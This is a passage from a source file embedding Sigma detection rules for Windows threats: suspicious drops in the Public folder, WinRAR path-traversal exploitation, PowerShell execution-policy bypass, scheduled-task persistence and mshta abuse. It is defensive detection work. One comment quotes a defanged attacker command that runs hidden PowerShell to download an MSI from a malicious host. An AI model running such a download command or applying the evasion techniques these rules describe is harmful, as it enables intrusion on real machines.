    - attack.defense_evasion
    - attack.t1564
logsource:
    category: file_event
    product: windows
detection:
    selection_base:
        Image|contains: '.'
        TargetFilename|contains: '\Users\Public' #C:\Users\Public\test.vbs
    selection_ext:
        TargetFilename|endswith:
            - '.vbe' # https://www.genians.co.kr/en/blog/threat_intelligence/operation-gitpower
            - '.cpl' # https://www.picussecurity.com/resource/blog/dropping-elephant-patchwork-espionage-apt-tactics-and-tool
            - '.png' #https://cert.gov.ua/article/6284080; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://isc.sans.edu/diary/rss/32884
            - '.bak' # https://dreamgroup.com/blog/darkblinders-inside-an-active-espionage-campaign
            #- '.ini' #noizy; https://www.esentire.com/blog/new-rust-malware-chaosbot-uses-discord-for-command-and-control
            - '.ico' # C:\Users\Public\Libraries\onedrive.ico
            - '.zip' #https://labs.withsecure.com/publications/crazyhunter-ransomware; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://isc.sans.edu/diary/SmartApeSG+campaign+pushes+Remcos+RAT+NetSupport+RAT+StealC+and+Sectop+RAT+ArechClient2/32826; https://www.genians.co.kr/en/blog/threat_intelligence/narwhalrat; https://cert.gov.ua/article/6318634
            - '.wav' #"C:\\Users\\Public\\1.wav"
            - '.dat' # NTUSER.dat, etc.; https://sect.iij.ad.jp/blog/2026/02/plugx-executed-via-staticplugin/; https://www.elastic.co/security-labs/brushworm-targets-financial-services
            - '.vbs' #https://cert.gov.ua/article/6281681 %PUBLIC%\Documents\UpdateOfficeCore.vbs; https://cert.gov.ua/article/6285731; %PUBLIC%\Downloads\gupdate.vbs; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-gogitter-gitshellpad-and-goshell; https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/; https://www.trellix.com/blogs/research/purerat-fileless-utilizing-steganography-process-hollowing/; https://asec.ahnlab.com/en/94847/
            - '.js' # https://www.huntress.com/blog/malspam-to-deskcvb-rat-delivery-chain-analysis; https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware
            - '.jse'
            - '.bat' #C:\Users\update1.bat; C:\Users\Public\Libraries\check.bat
            - '.url'
            - '.cmd'
            - '.hta' # https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/
            - '.ps1' #https://www.huntress.com/blog/data-exfiltration-threat-actor-infrastructure-exposed; https://www.pointwild.com/threat-intelligence/desckvb-rat-analysis-from-javascript-loader-to-fileless-net-rat/
            - '.com'
            #- '.lnk' #C:\Users\Public\Libraries\OneDrive Update\Exec.lnk
            - '.dll' #C:\Users\Public\dump.dll; # %PUBLIC%\Libraries\rtmpak.dll; https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/; https://sect.iij.ad.jp/blog/2026/02/plugx-executed-via-staticplugin/; https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html; https://www.elastic.co/security-labs/brushworm-targets-financial-services; https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html; https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/; https://hexastrike.com/resources/blog/threat-intelligence/trust-the-tunnel-get-the-trojan-silver-fox-delivers-atlascross-rat-via-weaponized-vpn-installers/; ttps://www.proofpoint.com/us/blog/threat-insight/id-come-running-back-eu-again-ta416-resumes-european-government-espionage; https://asec.ahnlab.com/en/94704/; https://www.forescout.com/blog/from-clickfix-to-c2-comparative-analysis-of-two-malware-loaders/
            - '.exe' #C:\Users\Public\ad.exe; https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/; https://cert.gov.ua/article/6285731; %PUBLIC%\Downloads\GoogleUpdate.exe; %PUBLIC%\Downloads\pkdhj.exe; https://www.esentire.com/blog/new-rust-malware-chaosbot-uses-discord-for-command-and-control; https://www.sentinelone.com/blog/cybervolk-returns-flawed-volklocker-brings-new-features-with-growing-pains/; https://www.trellix.com/blogs/research/the-ghost-in-the-machine-crazyhunters-stealth-tactics/; https://www.acronis.com/en/tru/posts/hunters-international-new-ransomware-based-on-hive-source-code/; https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/; https://sect.iij.ad.jp/blog/2026/02/plugx-executed-via-staticplugin/; https://www.picussecurity.com/resource/blog/t1059-001-powershell; https://www.bitdefender.com/en-us/blog/businessinsights/apt36-nightmare-vibeware; https://www.picussecurity.com/resource/blog/t1059-003-windows-command-shell; https://unit42.paloaltonetworks.com/boggy-serpens-threat-assessment/]; https://www.cyberproof.com/blog/a-deep-dive-into-pxa-stealer/; https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/; https://ctrlaltintel.com/research/MuddyWater/; https://www.zscaler.com/blogs/security-research/tropic-trooper-pivots-adaptixc2-and-custom-beacon-listener; https://blog.deception.pro/blog/xworm-sc-hok-may-2026; https://asec.ahnlab.com/en/94552/; https://www.picussecurity.com/resource/blog/the-tradecraft-behind-2026s-least-prevented-ransomware-families; https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/; https://blog.knowbe4.com/anatomy-agent-tesla-bec-attack-in-memory-infostealer; https://www.guidepointsecurity.com/blog/how-play-achieves-encryption/; https://www.microsoft.com/en-us/security/blog/2026/09/01/counterfeit-installers-system-compromise-tracking-deceptive-software-download-campaign/; https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
            #- '.pdf' #noizy
            - '.log' # C:\users\public\log.log; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://isc.sans.edu/diary/rss/33300; https://www.seqrite.com/blog/inside-dragonforce-how-a-ransomware-cartels-payload-actually-runs/
            - '.conf' # C:\\Users\\Public\\Libraries\\update.conf
            - '.mui' #c:\users\public\iconcache.mui.
            - '.sys' #https://www.picussecurity.com/resource/blog/what-are-bring-your-own-vulnerable-driver-byovd-attacks; https://www.securonix.com/blog/faux-elevate-threat-actors-crypto-miners-and-infostealers/; https://asec.ahnlab.com/en/95211/; https://www.huntress.com/blog/two-inc-ransom-notes; https://blog-en.itochuci.co.jp/entry/2026/09/25/090000
            - '.msi' #https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/
            #- '.xml' #noizy
            - '.cab'
            - '.com' #https://cert.gov.ua/article/6281681
            - '.txt' #https://cert.gov.ua/article/6284949; https://www.elastic.co/security-labs/roningloader; https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/; https://www.fortinet.com/blog/threat-research/udpgangster-campaigns-target-multiple-countries; https://www.bitdefender.com/en-us/blog/businessinsights/apt36-nightmare-vibeware; https://www.huntress.com/blog/data-exfiltration-threat-actor-infrastructure-exposed; https://www.bluevoyant.com/blog/augmented-marauders-multi-pronged-casbaneiro-campaigns; https://www.trendmicro.com/en_us/research/26/e/banana-rat.html; https://www.zscaler.com/blogs/security-research/clickfix-campaign-generated-ai-delivers-smartrat; https://socradar.io/blog/operation-conflict-compass-konni-ukraine-lnk-lure/; https://hunt.io/blog/philippine-government-employment-agency-records-stolen
            - '.doc' #https://cert.gov.ua/article/6318634
            - '.docx' #https://cert.gov.ua/article/6318634
            - '.toml' #C:\Users\Public\systemTemp\config.toml; BackupSpy; https://www.bitdefender.com/en-us/blog/businessinsights/apt36-nightmare-vibeware
            - '.xml' #https://www.security.com/threat-intelligence/asyncrat-libya-oil-cyberattack
            - '.jpg' #https://blog.sekoia.io/silver-fox-the-only-tax-audit-where-the-fine-print-installs-malware/; https://www.picussecurity.com/resource/blog/unc1549-ttps-iranian-apt-targeting-aerospace-and-defense
    filters:
        Image|endswith:
            - 'elastic-endpoint.exe'
            - 'Foxit Reader.exe'
    condition: (selection_base and selection_ext) and not filters
falsepositives:
    - highly possible, anyone can execute a binary from this location. Additional whitelisting is likely required
level: low
"#,
  // Possible CVE-2025-8088 / CVE-2025-6218 (WinRAR Vulnerability) Exploitation Attempt (via file_event)
  "c550cc75-398e-4985-a1e9-5088e126e468": r#"title: Possible CVE-2025-8088 / CVE-2025-6218 (WinRAR Vulnerability) Exploitation Attempt (via file_event)
id: c550cc75-398e-4985-a1e9-5088e126e468
status: stable
author: SOC Prime Team
description: Exploiters can craft archives that drop executable files into locations that automatically run programs, like the Windows Startup folder. (threat actor Storm-0978 (Tropical Scorpius / UNC2596) uses this technique to deliver RomCom backdoors.)
references:
  - https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q2-2026-q3-2026/
  - https://www.picussecurity.com/resource/blog/gamaredon-primitive-bear-apt-profile-and-mitre-attck-breakdown
  - https://www.welivesecurity.com/en/eset-research/gamaredon-2025-leveraging-tunnels-workers-dead-drops-new-alliances/
  - https://blog.synapticsystems.de/ghostshell-mb-0009-targeting-ukraines-uav-operations-and-defense-supply-chain/
  - https://www.trendmicro.com/en_us/research/26/f/old-winrar-flaw-fuels-attacks-on-ukraine.html
  - https://blog.sekoia.io/fsbs-matryoshka-1-3-gamaredons-gifts-that-keeps-unpacking-gammaphish-and-gammaworm/
  - https://harfanglab.io/insidethelab/gamaredon-gammadrop-gammaload/
  - https://blog.synapticsystems.de/obfuscation-without-effort-breaking-a-uac-0226-giftedcrook-stealer/
  - https://cert.gov.ua/article/6287707
  - https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/
  - https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/
  - https://www.pcmag.com/news/patch-now-new-winrar-flaw-used-to-deliver-malware
  - https://www.seqrite.com/blog/winrar-directory-traversal-ntfs-ads-vulnerabilities-cve-2025-6218-cve-2025-8088/
  - https://cloud.google.com/blog/topics/threat-intelligence/exploiting-critical-winrar-vulnerability?e=48754805
  - https://research.checkpoint.com/2026/amaranth-dragon-weaponizes-cve-2025-8088-for-targeted-espionage/
  - https://www.trellix.com/blogs/research/malware-as-a-service-redefined-xworm-rat/
tags:
  - attack.t1203
  - attack.execution
  - attack.t1547.001
  - attack.persistence
logsource:
  category: file_event
  product: windows
detection:
  selection:
    Image|endswith: 'WinRAR.exe'
    TargetFilename|endswith: '\Programs\Startup' #\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Display Settings.lnk
  condition: selection
falsepositives:
  - Unknown
level: high
"#,
  // Powershell Executing File In Suspicious Directory Using Bypass Execution Policy (via cmdline)
  "c77d19cf-3624-4e67-9474-69b44568d39f": r#"title: Powershell Executing File In Suspicious Directory Using Bypass Execution Policy (via cmdline)
id: c77d19cf-3624-4e67-9474-69b44568d39f
status: stable
author: SOC Prime Team
description: Adversaries may try to execute malicious powershell script by using bypass execution policy in order to perform malicious activity.
references:
  - https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
  - https://www.genians.co.kr/en/blog/threat_intelligence/operation-gitpower
  - https://www.securonix.com/blog/task-stomp-powershell-backdoor-document-theft-remote-access
  - https://blog.polyswarm.io/the-job-offer-has-claws-mirage-kitten-deploys-noderabbit-and-pollcat
  - https://www.genians.co.kr/en/blog/threat_intelligence/ai-agent-opencode
  - https://www.levelblue.com/blogs/spiderlabs-blog/hiding-in-the-chain-multi-stage-lnk-attack-leveraging-ton-blockchain-to-deliver-node.js-backdoor
  - https://blog.itochuci.co.jp/entry/2026/06/11/111500
  - https://blog.itochuci.co.jp/entry/2026/06/11/110000
  - https://www.fortinet.com/blog/threat-research/phishing-campaign-deploys-javascript-driven-purelogs-variant-to-steal-sensitive-data
  - https://blog.talosintelligence.com/uat-8302/
  - https://www.huntress.com/blog/komari-c2-agent-abuse
  - https://cert.gov.ua/article/6288271
  - https://www.esentire.com/blog/stx-rat-a-new-rat-in-2026-with-infostealer-capabilities
  - https://www.pointwild.com/threat-intelligence/desckvb-rat-analysis-from-javascript-loader-to-fileless-net-rat/
  - https://unit42.paloaltonetworks.com/analysis-of-bunnyloader-malware/
  - https://blogs.blackberry.com/en/2024/04/fin7-targets-the-united-states-automotive-industry
  - https://www.fortinet.com/blog/threat-research/fickle-stealer-distributed-via-multiple-attack-chain
  - https://labs.k7computing.com/index.php/kematian-stealer-forked-from-powershell-token-grabber/
  - https://hunt.io/blog/asyncrat-screenconnect-open-directory-campaigns
  - https://www.acronis.com/en/tru/posts/boto-cor-de-rosa-campaign-reveals-astaroth-whatsapp-based-worm-activity-in-brazil/
  - https://asec.ahnlab.com/en/92183/
  - https://blackpointcyber.com/blog/novel-fake-captcha-chain-delivering-amatera-stealer/
  - https://gmo-cybersecurity.com/blog/revisiting-gpugate-repo-squatting-and-opencl-deception-to-deliver-hijackloader/
  - https://www.pointwild.com/threat-intelligence/when-malware-talks-back
  - https://censys.com/blog/voicemail-trap-german-language-voicemail-lure-remote-access
  - https://www.pointwild.com/threat-intelligence/when-malware-talks-back/
  - https://www.security.com/threat-intelligence/iran-cyber-threat-activity-us
  - https://www.threatdown.com/blog/castlerat-cyber-attack-is-the-first-to-abuse-deno-javascript-runtime-to-evade-enterprise-security/
  - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/
  - https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect
  - https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos
tags:
  - attack.t1059.001
  - attack.execution
logsource:
  category: process_creation
  product: windows
detection:
  selection_base:
    Image|endswith: 'powershell.exe'
    CommandLine|contains:
      - 'Bypass'
  selection_policy:
    CommandLine|contains:
      - '-ExecutionPolicy'
      - '-ep'
  selection_files:
    CommandLine|contains:
      - '-File ' #https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://www.threatdown.com/blog/castlerat-cyber-attack-is-the-first-to-abuse-deno-javascript-runtime-to-evade-enterprise-security/; https://www.fortinet.com/blog/threat-research/phishing-campaign-deploys-javascript-driven-purelogs-variant-to-steal-sensitive-data; https://blog.polyswarm.io/the-job-offer-has-claws-mirage-kitten-deploys-noderabbit-and-pollcat
      - '-f' #Powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.3.1\\MdeExtensionHandler.ps1
      - '-command' #powershell.exe -windowstyle hidden -executionpolicy bypass\ -command "invoke-webreguest 'hXXps://coffe-estilo[.]com/macforte/installer.msi' -outfile 'c:\temp\intalskji.msi'"; https://www.acronis.com/en/tru/posts/boto-cor-de-rosa-campaign-reveals-astaroth-whatsapp-based-worm-activity-in-brazil/; https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/
  selection_dirs:
    CommandLine|contains:
      - 'AppData' # https://www.esentire.com/blog/stx-rat-a-new-rat-in-2026-with-infostealer-capabilities; https://cert.gov.ua/article/6288271; https://www.genians.co.kr/en/blog/threat_intelligence/ai-agent-opencode; https://www.securonix.com/blog/task-stomp-powershell-backdoor-document-theft-remote-access
      - 'Temp' # https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos; https://www.huntress.com/blog/komari-c2-agent-abuse; https://blog.talosintelligence.com/uat-8302/; https://blog.itochuci.co.jp/entry/2026/06/11/110000; https://www.levelblue.com/blogs/spiderlabs-blog/hiding-in-the-chain-multi-stage-lnk-attack-leveraging-ton-blockchain-to-deliver-node.js-backdoor; https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
      - 'WinSxS'
      - '\Public' # https://www.pointwild.com/threat-intelligence/desckvb-rat-analysis-from-javascript-loader-to-fileless-net-rat/; https://www.genians.co.kr/en/blog/threat_intelligence/operation-gitpower
      - ' \\'
  filters:
    CommandLine|contains:
      - 'Filehash'
      - 'Pycharm'
      - 'Get-AuthenticodeSignature' #msi
  condition: (selection_base and selection_files and selection_policy and selection_dirs) and not filters
falsepositives:
  - Legitimate powershell script execution
level: medium
"#,
  // Possible Scheduled Task Creation Using Powershell (via powershell)
  "ca5427f8-ede3-48df-b98c-5fa254010b2a": r#"title: Possible Scheduled Task Creation Using Powershell (via powershell)
id: ca5427f8-ede3-48df-b98c-5fa254010b2a
status: stable
description: Adversaries may try to create scheduled task using powershell in order to maintain persistence on the compromised host.
author: SOC Prime Team
references:
  - https://cert.gov.ua/article/6318863
  - https://vrls.ws/posts/abusing-gitlab-ci-runners-as-c2/
  - https://www.fortinet.com/blog/threat-research/scrubcrypt-deploys-venomrat-with-arsenal-of-plugins
  - https://www.genians.co.kr/blog/threat_intelligence/dropbox
  - https://asec.ahnlab.com/en/66429/
  - https://www.securonix.com/blog/analyzing-deepdrive-north-korean-threat-actors-observed-exploiting-trusted-platforms-for-targeted-attacks/
  - https://arcticwolf.com/resources/blog/romcom-utilizing-socgholish-to-deliver-mythic-agent-to-usa-companies-supporting-ukraine/
  - https://www.derp.ca/research/plog-rat-analysis/
tags:
  - attack.t1053
  - attack.execution
  - attack.persistence
  - attack.privilege_escalation
logsource:
  service: powershell
  product: windows
detection:
  selection:
    ScriptBlockText|contains|all:
      - 'Register-ScheduledTask' # https://www.derp.ca/research/plog-rat-analysis/
      - 'TaskName'
      - 'Action'
     # - 'Hidden'
  condition: selection
falsepositives:
  - Unknown
level: medium
"#,
  // MSHTA Execution with Suspicious File Extensions
  "cc7abbd0-762b-41e3-8a26-57ad50d2eea3": r#"title: MSHTA Execution with Suspicious File Extensions
id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3
status: test
description: |
  Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,
  such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications
  containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and
  execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.
references:
  - http://blog.sevagas.com/?Hacking-around-HTA-files
  - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356
  - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script
  - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997
  - https://twitter.com/mattifestation/status/1326228491302563846
  - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c
author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule), Swachchhanda
  Shrawan Poudel (Nextron Systems)
date: 2019-02-22
modified: 2025-05-12
tags:
  - attack.stealth
  - attack.t1140
  - attack.t1218.005
  - attack.execution
  - attack.t1059.007
  - cve.2020-1599
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: \mshta.exe
    - OriginalFileName: mshta.exe
  selection_cli:
    CommandLine|contains:
      - .7z
      - .avi
      - .bat
      - .bmp
      - .conf
      - .csv
      - .dll
      - .doc
      - .gif
      - .gz
      - .ini
      - .jpe
      - .jpg
      - .json
      - .lnk
      - .log
      - .mkv
      - .mp3
      - .mp4
      - .pdf
      - .png
      - .ppt
      - .rar
      - .rtf
      - .svg
      - .tar
      - .tmp
      - .txt
      - .xls
      - .xml
      - .yaml
      - .yml
      - .zip
      - vbscript
  condition: all of selection_*
falsepositives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
level: high
"#,
  // An Archive Was Extracted To Suspicious Directory Using Powershell (via powershell)
